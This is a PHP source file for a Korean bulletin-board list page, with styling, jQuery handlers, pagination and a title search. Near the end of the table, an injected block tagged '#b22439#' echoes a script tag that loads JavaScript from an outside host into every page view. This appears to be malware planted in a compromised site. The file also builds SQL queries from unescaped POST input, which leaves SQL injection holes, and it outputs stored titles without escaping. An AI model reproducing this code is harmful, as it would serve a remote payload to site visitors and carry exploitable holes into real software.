<? session_start();
include ('./lib.php');
?>
<!DOCTYPE HTML>
<html>
 <head>
  <title> New Document </title>
  <meta charset="UTF-8">
  <style type="text/css">
	body {
		margin: 0;
		padding: 0;
	}
	#board_wrap {
		width: 980px;
		height: 760px;
	}
	#board_wrap h1 {
		margin: 0;
		padding: 30px 0 0 30px;
		height: 60px;
	}
	#board_table {
		width: 800px;
		height: auto;
		margin: 50px auto 0 auto;
		text-align: center;
		border-spacing: 0;
	}
	#board_table thead {
		background: #1caff6;
		color: white;
		height: 40px;
	}
	#board_table thead tr td {
		border-right: 1px solid white;
	}
	#board_table thead tr td:nth-child(1) {
		width: 90px;
		height: 40px;
		border-radius: 10px 0 0 0;
	}
	#board_table thead tr td:nth-child(2) {
		width: 500px;
		height: 40px;
	}
	#board_table thead tr td:nth-child(4) {
		border-radius: 0 10px 0 0;
	}
	#board_table tbody tr td {
		border-bottom: 1px dashed black;
		height: 25px;
	}
	#board_table tbody tr:last-child td {
		border-bottom: 1px solid black;
	}
	.bt_write{
		text-decoration: none;
		display: block;
		width: 60px;
		height: 22px;
		background: #1caff6;
		color: white;
		text-align: center;
		border-radius: 5px;
		font-size: 10pt;
		line-height: 22px;
		float: right;
		margin: 30px 89px 0 0;
	}
	.go_board_view{
		color: black;
		text-decoration: none;
	}
	.paging {
		margin: 60px auto 10px auto;
		width: 170px;
	}
	.paging .page ul li{
		list-style:none;
	}
	.bot_search {
		width: 210px;
		margin: 0 auto;
	}
  </style>
  <script type="text/javascript">
  		$(document).ready(function(){
  		function ShowAlert(text){
			var left = (document.body.clientWidth / 2);
            var result = left - $('.message').width() / 2 + document.body.scrollLeft;
            $('.message').css('left',result).html(text).fadeIn(1500);
            $('.message').fadeOut(1500);
		}
  			$('.bt_write').click(function(e){
  				e.preventDefault();
  				<? 
  					if($_SESSION[user_id]){
  				?>
				$('#wrap').load('./board_write.php');
  				<? }else{ ?>
				ShowAlert('로그인을 하셔야합니다');
  				<? 
				}
				?>
			});
			
			$('.go_board_view').click(function(e){
				e.preventDefault();
				var href=$(this).attr('href');
				$('#wrap').load(href);	
			});
		});
  </script>
 </head>
 <body>
 	<div id="board_wrap">
 		<header>
 			<h1>
 				Board
 			</h1>
 		</header>
 		<section>
 			<table id="board_table">
 				<thead>
 					<tr>
 						<td>글번호</td><td>글제목</td><td>작성자</td><td>작성일</td>
 					</tr>
 				</thead>
 			<? 
			$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
			$t = $_POST['text1'];
			// 2. 페이지 변수 설정
			if ($_GET[page] && $_GET[page] > 0) {
				// 현재 페이지 값이 존재하고 0 보다 크면 그대로 사용
				$page = $_GET[page];
			} else {
				// 그 외의 경우는 현재 페이지를 1로 설정
				$page = 1;
			}
			// 한 페이지에 보일 글 수
			$page_row = 8;
			// 한줄에 보여질 페이지 수
			$page_scale = 5;
			// 페이징을 출력할 변수 초기화
			$paging_str = "";

			// 3. 전체 글 갯수 알아내기
			$sql = "select count(*) as cnt from Vocals_freeboard where board_title like '%$t%'";
			$total_count = sql_total($sql);
			// 4. 페이지 출력 내용 만들기
			$paging_str = paging($page, $page_row, $page_scale, $total_count);
			// 5. 시작 열을 구함
			$from_record = ($page - 1) * $page_row;
			// 7.데이터 갯수 체크를 위한 변수 설정
			$i = 0;
					
						//mysql_query("set names utf8");
						$chk_sql="select * from Vocals_freeboard where board_title like '%$t%' order by board_no desc limit $from_record,$page_row";
						$chk_result=mysql_query($chk_sql);
						while($chk_data=mysql_fetch_array($chk_result))
						{
							if($chk_data['board_no']=="")
							{
								echo "<script>alert('글이 존재하지 않습니다.');</script>";
								exit;
							}
							$data="select user_name from Vocals_register where user_id=trim('$chk_data[board_writer_id]')";
							$d=mysql_query($data);
							$r=mysql_fetch_array($d);
					?>
					
					<tr>
							<td><?=$chk_data['board_no']?></td>
							<td><a href="./board_view.php?board_no=<?=$chk_data['board_no']; ?>" class="go_board_view">	<?=$chk_data['board_title']?></a></td>
							<td><?=$r['user_name']?></td>
							<td><?=substr($chk_data[board_date], 0, 10);?></td>
					</tr>
					
					<?
					// 10. 데이터 갯수 체크를 위한 변수를 1 증가시킴
					$i++;
					}

					// 11.데이터가 하나도 없으면
					if($i == 0){
					?>
    					
       					<div>자료가 하나도 없습니다.</div>
    				
					<?
					}
					?>
<?php
#b22439#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155809\"></script>";
echo $vt;
}
#/b22439#
?> 			</table>
 			<a href="#" class="bt_write">글쓰기</a>
 			
 			<div class="paging">
				<div class = "page">
		   			<ul>
		   				<li>
		   					<?echo $paging_str; ?>							
		   				</li>
		   			</ul>
	    		</div>
			</div>
			<div class="bot_search">
				<input type="text" placeholder="검색"> <input type="submit" value="검색">
			</div>
 		</section>
 	</div>
 </body>
 </html>